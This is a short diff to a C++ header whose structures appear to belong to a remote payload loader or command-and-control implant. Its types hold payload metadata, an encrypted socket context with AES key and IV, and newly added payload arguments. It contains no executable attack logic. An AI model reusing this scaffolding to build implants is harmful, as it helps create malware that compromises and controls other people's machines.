@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <vector>
 #include <net.h>
+#include <iostream>
 
 #pragma pack(1)
 typedef struct _UNICODE_STRING {
@@ -68,7 +69,8 @@ typedef struct _PAYLOADINFO {
 	ULONG payload_size;
 	USHORT payload_type;
 	USHORT payload_arch;
-	char padding[8];
+	USHORT payload_argc;
+	char padding[6];
 } PAYLOADINFO, * PPAYLOADINFO;
 
 typedef struct _PAYLOAD {
@@ -82,14 +84,18 @@ typedef struct _CONFIG {
 	long id = 0x0;
 } CONFIG, * PCONFIG;
 
+typedef struct _ARGUMENT {
+	USHORT arg_size;
+	char arg_data[254];
+} ARGUMENT, * PARGUMENT;
+
 typedef struct {
 	SOCKET connection;
 	std::vector<UCHAR> aes_key;
 	std::vector<UCHAR> iv_key;
 	RECVENCRYPTED recv_encrypted;
 	SENDENCRYPTED send_encrypted;
-	int argc;
-	char** argv;
+	std::vector<std::string> argv;
 }MODULE_CONTEXT, * PMODULE_CONTEXT;
 
 #pragma pack(0)
